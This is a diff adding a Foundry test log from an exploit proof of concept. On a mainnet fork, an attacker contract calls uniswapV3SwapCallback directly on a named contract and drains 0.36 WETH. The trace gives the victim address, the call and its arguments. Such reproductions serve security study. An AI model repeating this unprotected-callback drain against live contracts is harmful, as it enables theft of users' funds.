@@ -1,0 +1,52 @@
+No files changed, compilation skipped
+warning[3445]: function named `fallback`
+  --> test/unverified_a89f_exp.sol:59:14
+   |
+59 |     function fallback() external payable {}
+   |              ^^^^^^^^
+   |
+help: remove the `function` keyword if you intend this to be a contract's fallback function
+  --> test/unverified_a89f_exp.sol:59:5
+   |
+59 |     function fallback() external payable {}
+   |     ^^^^^^^^
+
+
+Ran 1 test for test/unverified_a89f_exp.sol:ContractTest
+[PASS] testPoC() (gas: 290344)
+Logs:
+  after attack: balance of address(attC): 0.360000000000000000
+
+Traces:
+  [3644] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 20683452 [2.068e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [295144] ContractTest::testPoC()
+    ├─ [0] VM::startPrank(0xfe51ffcd2af4748d77130646988F966733583dc1, 0xfe51ffcd2af4748d77130646988F966733583dc1)
+    │   └─ ← [Return]
+    ├─ [215255] → new AttackerC@0xB919AD3eEeC6FEAFb3e8a111D11F79544f76f6ee
+    │   └─ ← [Return] 1075 bytes of code
+    ├─ [39358] AttackerC::attack()
+    │   ├─ [34979] 0xb3094734FE249A7b0110dC12D66F6C404aDA28Cb::uniswapV3SwapCallback(360000000000000000 [3.6e17], -86965571293199577 [-8.696e16], 0x000000000000000000000000000000000000000000000000000000000000000000)
+    │   │   ├─ [358] AttackerC::token0() [staticcall]
+    │   │   │   └─ ← [Return] WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   ├─ [29962] WETH9::transfer(AttackerC: [0xB919AD3eEeC6FEAFb3e8a111D11F79544f76f6ee], 360000000000000000 [3.6e17])
+    │   │   │   ├─ emit Transfer(from: 0xb3094734FE249A7b0110dC12D66F6C404aDA28Cb, to: AttackerC: [0xB919AD3eEeC6FEAFb3e8a111D11F79544f76f6ee], value: 360000000000000000 [3.6e17])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x142aa18bbc81fd2cc51ce75d6b7f00a4bdacef5b49c277e93b204b3f5b89634f: 0 → 0x00000000000000000000000000000000000000000000000004fefa17b7240000
+    │   │   │   │   @ 0x4fd5ac0d0336462a50570b3429879649a2e8c3533097aca8f488ce8b6850c483: 0x00000000000000000000000000000000000000000000000004fefa17b7240000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [534] WETH9::balanceOf(AttackerC: [0xB919AD3eEeC6FEAFb3e8a111D11F79544f76f6ee]) [staticcall]
+    │   └─ ← [Return] 360000000000000000 [3.6e17]
+    ├─ emit log_named_decimal_uint(key: "after attack: balance of address(attC)", val: 360000000000000000 [3.6e17], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.90s (1.47s CPU time)
+
+Ran 1 test suite in 4.14s (2.90s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
